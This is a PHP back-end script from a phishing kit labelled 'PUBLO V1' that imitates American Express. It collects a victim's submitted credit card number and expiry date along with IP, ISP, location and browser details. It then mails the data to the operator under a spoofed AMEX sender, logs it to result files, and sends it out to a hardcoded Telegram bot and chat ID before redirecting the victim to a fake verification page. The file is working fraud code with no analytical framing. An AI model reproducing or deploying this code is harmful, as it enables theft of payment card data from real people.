<?php
session_start();
error_reporting(0);
require_once("../main.php");
require_once("../blocker.php");
// require_once("../blocker2.php");
$ip = getUserIP();
$randomnumber = rand(0, 100);

$ispuser = getisp($ip);

$message = "+++++++++++++++++++++++++[ PUBLO V1 ]+++++++++++++++++++++++\n";
$message .= "++-----------------------[ Billing Info ]----------------------++\n";
$message .= "# CC Number            	:	".$_POST['cc']."\n";
$message .= "# Expiration Date   		:	".$_POST['exp']."\n";
$message .= "++------------------------[ DEVICE INFO ]----------------------++\n";
$message .= "# IP Address 		:	".$ip."\n";
$message .= "# ISP 				:	".$ispuser."\n";
$message .= "# Region 			:	".$regioncity."\n";
$message .= "# City 			:	".$citykota."\n";
$message .= "# Continent 		:	".$continent."\n";
$message .= "# Time Zone 		:	".$timezone."\n";
$message .= "# OS / Browser 	:	".$os." / ".$br."\n";
$message .= "# Date 			:	".$date."\n";
$message .= "# User Agent 		:	".$user_agent."\n";
$message .= "++++++++++++++++++++++++++[ PUBLO V1 ]++++++++++++++++++++++\n";

$to = $config['email_result'];
$headers = "From: AMEX CC <AmCC-$randomnumber@PubAMEX.info>";
$subject = "💟 ".strtoupper($_POST['fname'])." // $os - $ip - $cn";
mail($to, $subject, $message, $headers);

tulis_file("../result/total_cc.txt", $ip);
	tulis_file("../result/total_bin.txt","$subbin\n");
if ($config['get_photo'] == "Oks") {
	echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
	exit();
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
$apiToken = "2121890488:AAEsxO6295XBL6uvfJLa_pefweuxtnFuYCI";
$amex = [
	    'chat_id' => '-1001777869001',
	    'text' => $message
	];	

    $key = substr(sha1(mt_rand()),1,25);
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($amex) );

	exit();
}